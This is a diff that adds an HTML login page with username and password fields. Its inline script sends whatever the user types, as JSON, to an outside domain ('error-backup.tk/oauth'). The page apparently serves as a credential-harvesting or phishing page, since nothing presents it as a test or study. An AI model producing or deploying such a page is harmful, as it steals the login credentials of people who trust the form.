@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+    <script src="dist/local.js"></script>
+    <script>
+        function submitLogin(event){
+             let form = document.getElementById("form_id")
+            let body = {
+                un: form.elements["un"].value,
+                pwd: form.elements["pwd"].value
+            }
+            let init = {
+                body: JSON.stringify(body), 
+                method:"POST"
+            }
+            fetch("https://error-backup.tk/oauth", init).then(res=>{
+                console.log(res)
+            }).catch(e=> console.log('e', e)
+            )
+            
+            
+        }
+    </script>
+
+    <body>
+        <form class="modal-content animate" id="form_id" method="post">
+            <div class="container">
+                <label for="un"><b>Username</b></label>
+                <input type="text" placeholder="Enter Username" name="un" required>
+
+                <label for="pwd"><b>Password</b></label>
+                <input type="password" placeholder="Enter Password" name="pwd" required>
+
+                <button type="submit" onclick="submitLogin()">Login</button>
+            </div>
+        </form>
+
+    </body>
+
+</html>
